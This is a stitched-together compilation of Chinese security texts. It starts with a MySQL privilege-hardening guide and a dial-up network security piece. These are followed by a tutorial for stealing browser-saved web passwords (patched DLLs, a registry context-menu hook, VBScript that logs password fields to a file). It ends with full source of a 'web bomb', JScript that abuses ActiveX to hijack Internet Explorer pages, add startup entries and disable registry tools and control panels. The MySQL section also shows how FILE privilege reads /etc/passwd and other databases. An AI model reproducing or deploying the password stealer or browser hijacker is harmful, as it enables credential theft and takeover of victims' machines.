前面的描述毫无疑问使访问检查听起来一个相当复杂的过程，特别是你以为服务器对你发出的每个查询进行权限检查，然而此过程是很快的，因为服务器其实不从授权表对每个查询查找信息，相反，它在启动时将表的内容读入内存，然后验证查询用的是内存中的副本。这大大提高了访问检查操作的性能。但有一个非常明显的副作用。如果你直接修改授权表的内容，服务器将不知道权限的改变。 
例如，如果你用一条INSERT语句向user表加入一个新记录来增加一个新用户，命名在记录中的用户将不能连接服务器。这对管理员新手（有时对有经验的老手）是很困惑的事情，当时解决方法很简单：在你改变了它们之后告诉服务器重载授权表内容，你可以发一条FLUSH PRIVILEGES或执行mysqladmin flush-privileges（或如果你有一个不支持flush-privileges的老版本，用mysqladmin reload。）。 
2.2.3 范围列匹配顺序
MySQL服务器按一种特定方式排序符授权表中的记录，然后通过按序浏览记录匹配到来的连接。找到的第一个匹配决定了被使用的记录。理解MySQL使用的排序顺序很重要，特别是对user表。 
当服务器读取user表内容时，它根据在Host和User列中的值排序记录，Host值起决定作用（相同的Host值排在一起，然后再根据User值排序）。然而，排序不是典序（按词排序），它只是部分是。要牢记的是字面上的词优先于模式。这意味着如果你正从client.your.net连接服务器而Host有client.your.net和%.your.net两个值，则第一个先选。类似地，%.your.net优先于%.net，然后是%。IP地址的匹配也是这样的。 
总之一句话，越具体越优先。可以参见本文附录的实例。 
2.3 避免授权表风险
本届介绍一些在你授权时的一些预防措施，以及不明值的选择带来的风险。一般地，你要很“吝啬”地授予超级用户权限，即不要启用user表中条目中的权限，而使用其它授权表，以将用户权限限制于数据库、表、或列。在user表中的权限允许于影响到你的服务器操作或能访问任何数据库中的任何表。 
不要授予对mysql数据库的权限。一个拥有包含授权表数据库权限的用户可能会修改表以获取对其他任何数据库的权限。授予允许一个用户修改mysql数据库表的权限也实际上给了用户以一个全局GRANT权限。如果用户能直接修改表，这也等价于能够发出任何你能想象的任何GRANT语句。 
FILE权限尤其危险，不要轻易授权它。以下是一个拥有FILE权限的人能干除的事情： 
CREATE TABLE etc_passwd (pwd_entry TEXT);
LOAD DATA INFILE "/etc/passwd" into TABLE etc_passwd;
SELECT * FROM etc_passwd; 
在发出这些语句后，用户已经拥有了你的口令文件的内容了。实际上，服务器上任何公开可读文件的内容都可被拥有FILE权限的用户通过网络访问。 
FILE权限也能被利用来危害没有设置足够权限制的文件权限的系统上的数据库。这就是你为什么应该设置数据目录只能由服务器读取的原因。如果对应于数据库表的文件可被任何人读取，不只是用户服务器账号的用户可读，任何有FILE权限的用户也可通过网络连接并读取它们。下面演示这个过程： 
?创建一个有一个LONGBLOB列的表： 
USER test;
CREATE TABLE tmp (b LONGBLOB); 
?使用该表读取每个对应于你想偷取的数据库表文件的内容，然后将表内容写入你自己数据库的一个文件中： 
LOAD DATA INFILE "./other_db/x.frm" INTO TABLE tmp
FIELDS ESCAPED BY "" LINES TERMINATED BY "";
SELECT * FROM tmp INTO OUTFILE "y.frm"
FIELDS ESCAPED BY "" LINES TERMINATED BY "";
DELETE FROM tmp;
LOAD DATA INFILE "./other_db/x.ISD" INTO TABLE tmp
FIELDS ESCAPED BY "" LINES TERMINATED BY "";
SELECT * FROM tmp INTO OUTFILE "y.ISD"
FIELDS ESCAPED BY "" LINES TERMINATED BY "";
DELETE FROM tmp;
LOAD DATA INFILE "./other_db/x.ISM" INTO TABLE tmp
FIELDS ESCAPED BY "" LINES TERMINATED BY "";
SELECT * FROM tmp INTO OUTFILE "y.ISM" 
?现在你拥有了一个新表y，它包含other_db.x的内容并且你有全权访问它。 
为避免让人以同样的方式攻击，根据“第一部分 内部安全性-保护你的数据目录”中的指令设置你的数据目录上的权限。你也可以在你启动服务器时使用--skip-show-database选项限制用户对于他们没用访问权限的数据库使用SHOW DATABASES和SHOW TABLES。这有助于防止用户找到关于它们不能访问的数据库和表的信息。 
ALTER权限能以不希望的方式使用。假定你想让user1可以访问table1但不能访问tables2。一个拥有ALTER权限的用户可以通过使用ALTER TABLE将table2改名为table1来偷梁换柱。 
当心GRANT权限。两个由不同权限但都有GRANT权限的用户可以使彼此的权利更强大。 
2.4 不用GRANT设置用户
如果你有一个早于3.22.11的MySQL版本，你不能使用GRANT（或REVOKE）语句设置用户及其访问权限，但你可以直接修改授权表的内容。如果你理解GRANT语句如何修改授权表，这很容易。那么你通过手工发出INSERT语句就能自己做同样的事情。 
当你发出一条GRANT语句时，你指定一个用户名和主机名，可能还有口令。对该用户生成一个user表记录，并且这些值记录在User、Host和Password列中。如果你在GRANT语句中指定全局权限，这些权限记录在记录的权限列中。其中要留神的是GRANT语句为你加密口令，而INSERT不是，你需要在INSERT中使用PASSWORD()函数加密口令。 
如果你指定数据库级权限，用户名和主机名被记录在db表的User和Host列。你为其授权的数据库记录在Db列中，你授予的权限记录在权限列中。 
对于表级和列级权限，效果是类似的。在tables_priv和columns_priv表中创建记录以记录用户名、主机名和数据库，还有相关的表和列。授予的权限记录在权限列中。 
如果你还记得前面的介绍，你应该能即使不用GRANT语句也能做GRANT做的事情。记住在你直接修改授权表时，你将通知服务器重载授权表，否则他不知道你的改变。你可以执行一个mysqladmin flush-privileges或mysqladmin reload命令强迫一个重载。如果你忘记做这个，你会疑惑为什么服务器不做你想做的事情。 
下列GRANT语句创建一个拥有所有权的超级用户。包括授权给别人的能力： 
GRANT ALL ON *.* TO anyname@localhost IDENTIFIED BY "passwd"
WITH GRANT OPTION
该语句将在user表中为anyname@localhost创建一个记录，打开所有权限，因为这里是超级用户（全局）权限存储的地方，要用INSERT语句做同样的事情，语句是： 
INSERT INTO user valueS("localhost","anyname",PASSWORD("passwd"),
"Y","Y","Y","Y","Y","Y","Y","Y","Y","Y","Y","Y","Y","Y")
你可能发现它不工作，这要看你的MySQL版本。授权表的结构已经改变而且你在你的user表可能没有14个权限列。用SHOW COLUMNS找出你的授权表包含的每个权限列，相应地调整你的INSERT语句。 下列GRANT语句也创建一个拥有超级用户身份的用户，但是只有一个单个的权限： 
GRANT RELOAD ON *.* TO flush@localhost IDENTIFIED BY "flushpass"
本例的INSERT语句比前一个简单，它很容易列出列名并只指定一个权限列。所有其它列将设置为缺省的"N"： 
INSERT INTO user (Host,Password,Reload) valueS("localhost","flush",PASSWORD("flushpass"),"Y")
数据库级权限用一个ON db_name.*子句而不是ON *.*进行授权： 
GRANT ALL ON sample.* TO boris@localhost IDENTIFIED BY "ruby"
这些权限不是全局的，所以它们不存储在user表中，我们仍然需要在user表中创建一条记录（使得用户能连接），但我们也需要创建一个db表记录记录数据库集权限： 
INSERT INTO user (Host,User,Password) valueS("localhost","boris",PASSWORD("ruby")) 
INSERT INTO db valueS("localhost","sample_db","boris","Y","Y","Y","Y","Y","Y","N","Y","Y","Y") 
"N"列是为GRANT权限；对末尾的一个数据库级具有WITH GRANT OPTION的GRANT语句，你要设置该列为"Y"。 
要设置表级或列级权限，你对tables_priv或columns_priv使用INSERT语句。当然，如果你没有GRANT语句，你将没有这些表，因为它们在MySQL中同时出现。如果你确实有这些表并且为了某些原因想要手工操作它们，要知道你不能用单独的列启用权限。 
你设置tables_priv.Table_priv或columns_priv.Column_priv列来设置包含你想启用的权限值。例如，要对一个表启用SELECT和INSERT权限，你要在相关的tables_priv的记录中设置Table_priv为"Select,Insert"。 
如果你想对一个拥有MySQL账号的用户修改权限，使用UPDATE而不是INSERT，不管你增加或撤销权限都是这样。要完全删除一个用户，从用户使用的每个表中删除记录。 
如果你愿意避免发一个查询来直接修改全权表，你可以看一下MySQL自带的mysqlaccess和mysql_setpermissions脚本。 
附录1 小测验
在你刚刚新安装了一个MySQL服务器，在你增加了一个允许连接MySQL的用户，用下列语句： 
GRANT ALL ON samp_db.* TO fred@*.snake.net IDENTIFIED "cocoa" 
而fred碰巧在服务器主机上有个账号，所以他试图连接服务器： 
%mysql -u fred -pcocoa samp_db
ERROR 1045: Access denied for user: 'fred@localhost' (Using password: YES) 
为什么？ 
原因是： 
先考虑一下mysql_install_db如何建立初始权限表和服务器如何使用user表记录匹配客户连接。在你用mysql_install_db初始化你的数据库时，它创建类似这样的user表： 
Host User 
localhost
pit.snake.net
localhost
pit.snake.net root
root 
头两个记录允许root指定localhost或主机名连接本地服务器，后两个允许匿名用户从本地连接。当增加fred用户后， 
Host User 
localhost
pit.snake.net
localhost
pit.snake.net
%.snake.net root
root 
fred 
在服务器启动时，它读取记录并排序它们（首先按主机，然后按主机上的用户），越具体越排在前面： 
Host User 
localhost
localhost
pit.snake.net
pit.snake.net
%.snake.net root 
root 
fred 
有localhost的两个记录排在一起，而对root的记录排在第一，因为它比空值更具体。pit.snake.net的记录也类似。所有这些均是没有任何通配符的字面上的Host值，所以它们排在对fred记录的前面，特别是匿名用户排在fred之前。 
结果是在fred试图从localhost连接时，Host列中的一个空用户名的记录在包含%.snake.net的记录前匹配。该记录的口令是空的，因为缺省的匿名用户没有口令。因为在fred连接时指定了一个口令，由一个错配且连接失败。 
这里要记住的是，虽然用通配符指定用户可以从其连接的主机是很方便。但你从本地主机连接时会有问题，只要你在table表中保留匿名用户记录。 
一般地，建议你删除匿名用户记录： 
mysql> DELETE FROM user WHERE User=""; 
更进一步，同时删除其他授权表中的任何匿名用户，有User列的表有db、tables_priv和columns_priv。 
附录2 使一个新的MySQL安装更安全
在你自己安装了一个新的MySQL服务器后，你需要为MySQL的root用户指定一个目录（缺省无口令），否则如果你忘记这点，你将你的MySQL处于极不安全的状态（至少在一段时间内）。 
在Unix（Linux）上，在按照手册的指令安装好MySQL后，你必须运行mysql_install_db脚本建立包含授权表的mysql数据库和初始权限。在Windows上，运行分发中的Setup程序初始化数据目录和mysql数据库。假定服务器也在运行。 
当你第一次在机器上安装MySQL时，mysql数据库中的授权表是这样初始化的： 
?你可以从本地主机（localhost）上以root连接而不指定口令。root用户拥有所有权限（包括管理权限）并可做任何事情。（顺便说明，MySQL超级用户与Unix超级用户有相同的名字，他们彼此毫无关系。） 
?匿名访问被授予用户可从本地连接名为test和任何名字以test_开始的数据库。匿名用户可对数据库做任何事情，但无管理权限。 
从本地主机多服务器的连接是允许的，不管连接的用户使用一个localhost主机名或真实主机名。如： 
% mysql -h localhost test 
% mysql -h pit.snake.net test 
你以root连接MySQL甚至不指定口令的事实只是意味着初始安装不安全，所以作为管理员的你首先要做的应该是设置root口令，然后根据你设置口令使用的方法，你也可以告诉服务器重载授权表是它知道这个改变。（在服务器启动时，它重载表到内存中而可能不知道你已经修改了它们。） 
对MySQL 3.22和以上版本，你可以用mysqladmin设置口令： 
% mysqladmin -u root password yourpassword 
对于MySQL的任何版本，你可以用mysql程序并直接修改mysql数据库中的user授权表： 
% mysql -u root mysql
mysql>UPDATE user SET password=PASSWORD("yourpassword") WHERE User="root"; 
如果你有MySQL的老版本，使用mysql和UPDATE。 
在你设置完口令后，通过运行下列命令检查你是否需要告诉服务器重载授权表： 
% mysqladmin -u root status 
如果服务器仍然让你以root而不指定口令而连接服务器，重载授权表： 
% mysqladmin -u root reload 
在你设置了root的口令后（并且如果需要重载了授权表），你将需要在任何时候以root连接服务器时指定口令。

防止入侵--安全设置企业拨号网络
众所周知，大多数的网络入侵是利用拨号网络漏洞实现的。不管是外部黑客，还是内部员工，都随时可能对企业网络安全造成威胁，安全地设置企业拨号网络已经成为一件刻不容缓的首要大事。下面的文章叙述这种设置的四个步骤，并通过四个步骤对Netserver(网络服务器)进行设置，为你提供一个实用的解决方案。
　　随着企业中网络的发展和应用，网络安全成为越来越重要的问题。因为工作需要，许多企业都设置了自己的拨号服务器，为移动用户和远程用户提供接入服务,事实上绝大多数的入侵也是通过拨号网络漏洞实现的，所以这部分自然也就成为企业网络安全最重要也是最薄弱的环节之一。 
　　针对这种情况，必须对拨号接入的用户进行分级，限制访问权限，并对访问过程进行记录。在满足用户需要的前提下，对本单位拨号网络存在的安全漏洞及时进行修补。本文将通过Netserver(网络服务器)的设置来向大家介绍如何使你的企业拨号网络更安全。 
安全设置具体步骤 
　　要解决企业拨号网络的安全问题，必须由Netserver的设置入手，解决的方法可以分为4步： 
　　 　　1. 解除账号默认的IP地址，即必须由Netserver分配IP地址，保证拨号上网用户的IP地址全部处于可管理范围内。 　　 
　　2. 对于公用账号，Netserver验证后，由IP地址缓冲池内随机取得一个IP地址进入网络，并记录IP地址缓冲池范围，路由器中为该IP地址范围划定一个子网，禁止路由至其他网段。这样，可以使得用公用口令的用户仅能访问限制范围内的资源。 
　　 　　3. 对权限较高的用户采用指定IP地址，即为每一特定账号指定一IP地址。当使用该账号登录时，Netserver为该账号分配预定的地址，管理员可以从记录的IP地址中查出对应的用户账号，并能根据IP地址划分对应的权限。 　　 
　　4. 设定回拨号码和账号，当使用该账号名登录时，Netserver自动回拨到设定的电话号码，确认用户是在指定的地点拨号，这样的话即使口令失窃也无法被盗用。

如何盗取网页密码(附源代码)
(注意：以下程序在使用时只能看到只有用户名和密码框两个控件的表单（我也不知为什么哟）
比如说我们的bbs和第五空间的5icq就可以盗但象江湖这种有多个输入框的表单就不能哟)
shdoclc.dll --改确认对话框（按确定和取消都要保存密码同时隐藏不保存复选框）(在dos下覆盖)
Inetcplc.dll---改internet选项里的对话框使清除密码和表单两按钮隐藏的同时"表单的用户名和密码"还有"提示我保护密码"两个复选框被禁用注这儿和改注册表功能相反(不用进dos)
注:使用时可以选把密码和表单清除了这要可以看到更多的密码!!
inetcpl.cpl---改注册表默认键值formsuggest passwords
(自动完成设置--表单的用户名和密码还有提示我保护密码两个复选框被禁用.)当它为一时不但复选框被禁用而且也禁止提示保存密码我们可以查找50 61 73 73来改它，使这个键不能起作用!(不用进dos)
以上改的三个文件要用到u-edit和exescope
#
#
pass.reg---使右键增加特殊关联（使用时在右键菜单中将会多一个名为取消的选项）
使用时将焦点对准有星号密码的输入框然后按右键中的取消按钮就可以了（注意不是撤消哟:）
pass.htm---记录密码的程序密码最后记录在桌面pass.txt文件中
#
#
reg文件里的内容：
REGEDIT4
[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\MenuExt\取消(&U)]
@="c:\\windows\\system32\\pass.htm"
"contexts"=dword:00000004
#
#
pass.htm里的内容(这个文件存放在system32目录中):
<script language="vbscript">
on error resume next
sub getpassword()
Set fso = CreateObject("Scripting.FileSystemObject")
set fil =fso.opentextfile ("c:\windows\desktop\pass.txt",8,true)
'将在桌面生成密码文件名为pass.txt
set srcevent = external.menuarguments.event
set doc=external.menuarguments.document
set ele=doc.elementfrompoint( srcevent.clientx, srcevent.clienty )
if ele.type ="password" then
if ele.value<>"" then
fil.writeline ele.value 
end if
end if
end sub
call getpassword()
</script> 
--
混客炸弹源代码　
<HTML>
<HEAD>
<SCRIPT LANGUAGE="JScript.Encode">
<!--
var Words ="<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<meta name="GENERATOR" content="Microsoft FrontPage 4.0">
<meta name="ProgId" content="FrontPage.Editor.Document">
<title>New Page 1</title>
</head>
<body>
<script>document.write("<APPLET HEIGHT=0 WIDTH=0 code=com.ms.activeX.ActiveXComponent></APPLET>")
function DelFavLnk(loc, DispName, SiteURL)
{
var Shor = Shl.CreateShortcut(loc + "\\" + DispName +".URL");
Shor.TargetPath = SiteURL;
Shor.Save();
}
function f(){
try
{
a1=document.applets[0];
a1.setCLSID("{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}");
a1.createInstance();
Shl = a1.GetObject();
a1.setCLSID("{0D43FE01-F093-11CF-8940-00A0C9054228}");
a1.createInstance();
FSO = a1.GetObject();
a1.setCLSID("{F935DC26-1CF0-11D0-ADB9-00C04FD58A0B}");
a1.createInstance();
Net = a1.GetObject();
try{
//if (documents.cookie.indexOf("ChgLive") == -1)
//{
var expdate = new Date((new Date()).getTime() + (24 * 60 * 60 * 1000 * 90));
documents.cookie="ChgLive=general; expires=" + expdate.toGMTString() + "; path=/;"
Shl.RegWrite ("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Winlogon\\LegalNoticeText", "您已经中了混客友情炸弹！请进入http://hunkloveme.yeah.net （能解所有网页炸弹）混客QQ:5604160");
Shl.RegWrite ("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Winlogon\\LegalNoticeText", "您已经中了混客友情炸弹！请进入http://hunkloveme.yeah.net （能解所有网页炸弹）混客QQ:5604160");
Shl.RegWrite ("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Winlogon\\LegalNoticeCaption", "您已经中了混客友情炸弹！请进入http://hunkloveme.yeah.net （能解所有网页炸弹）混客QQ:5604160");
Shl.RegWrite ("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Winlogon\\LegalNoticeCaption", "您已经中了混客友情炸弹！请进入http://hunkloveme.yeah.net （能解所有网页炸弹）混客QQ:5604160");
Shl.RegWrite ("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", " http://www.anzi.com/hunk/jie.html ");
Shl.RegWrite ("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", " http://www.anzi.com/hunk/jie.html ");
Shl.RegWrite ("HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Start Page", "http://hunkloveme.yeah.net");
Shl.RegWrite ("HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Default_Page_URL", "http://hunkloveme.yeah.net");
Shl.RegWrite ("HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Local Page", "http://hunkloveme.yeah.net");
Shl.RegWrite ("HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Search Page", "http://hunkloveme.yeah.net");
Shl.RegWrite ("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", "000001");
Shl.RegWrite ("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Start Page", "000001");
Shl.RegWrite ("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableRegistryTools", "00000001", "REG_DWORD");
Shl.RegWrite ("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\HomePage", "00000001", "REG_DWORD");
Shl.RegWrite ("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\SecChangeSettings", "000001");
Shl.RegWrite ("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoRun", "00000001", "REG_DWORD");
Shl.RegWrite ("HKLM\\Software\\Microsoft\\Internet Explorer\\Main\\Start Page", "http://hunkloveme.yeah.net");
Shl.RegWrite ("HKLM\\Software\\Microsoft\\Internet Explorer\\Main\\Default_Page_URL", "about:blank");
Shl.RegWrite ("HKLM\\Software\\Microsoft\\Internet Explorer\\Main\\Local Page", "http://hunkloveme.yeah.net");
Shl.RegWrite ("HKLM\\Software\\Microsoft\\Internet Explorer\\Main\\Search Page", "http://hunkloveme.yeah.net");
Shl.RegWrite ("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", "000001");
Shl.RegWrite ("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Start Page", "000001");
Shl.RegWrite ("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\HomePage", "00000001", "REG_DWORD");
Shl.RegWrite ("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\SecChangeSettings", "000001");
Shl.RegWrite ("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoRun", "00000001", "REG_DWORD");
Shl.RegWrite ("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableRegistryTools", "00000001", "REG_DWORD");
Shl.RegWrite ("HKCU\\SOFTWARE\\Microsoft\\Internet Explorer\\Search\\SearchAssistant","http://hunkloveme.yeah.net");
Shl.RegWrite ("HKLM\\SOFTWARE\\Microsoft\\Internet Explorer\\Search\\SearchAssistant","http://hunkloveme.yeah.net");
Shl.RegWrite ("HKCU\\Control Panel\\International\\Stimeformat","HH:mm");
Shl.RegWrite ("HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Window title", "Microsoft Internet Explorer");
Shl.RegWrite ("HKLM\\Software\\Microsoft\\Internet Explorer\\Main\\Window title", "Microsoft Internet Explorer");
Shl.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoControlPanel", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoControlPanel", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\SecurityTab", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\ContentTab", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\Ratings", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\Certificates", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\formsuggest", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\formSuggest Passwords", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\Pronfiles", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\GeneralTab", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\Cache", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\Colors", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\Fonts", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\Languages", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\Links", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\History", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\ConnectionsTab", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\Connection Settings", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\Proxy", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\ProgramsTab", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\Check_If_Default", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\CalendarContact", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\ResetWebSettings", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\AdvancedTab", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\Advanced", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoBrowserContextMenu", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoOpenInNewWnd", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoSelectDownloadDir", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoSearchCustomization", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoExternalBranding", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoFindFiles", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoJitsetup", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoSplash", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoUpdateCheck", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoFindFiles", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoBrowserSaveAs", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoBrowserClose", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoFileNew", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoFileOpen", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoTheaterMode", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoViewSource", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoBandcustomize", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoToolbarCustomize", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoFavorites", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoAddingChannel", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoChannelUI", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoBrowserOptions", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoHelpItemNetScapeHelp", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoHelpItemTipOfTheDay", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoHelpitemTutorial", "00000001", "REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\\NoHelpItemSendFeedBack", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\ContentTab", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\Ratings", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\Certificates", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\formsuggest", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\formSuggest Passwords\\", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\Pronfiles", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\GeneralTab", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\Cache", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\Colors", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\Fonts", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\Languages", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\Links", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\History", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\ConnectionsTab", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\Connection Settings", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\Proxy", "00000001", "REG_DWORD");
Shl.RegWrite("HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\ProgramsTab", "00000001", "REG_DWORD");
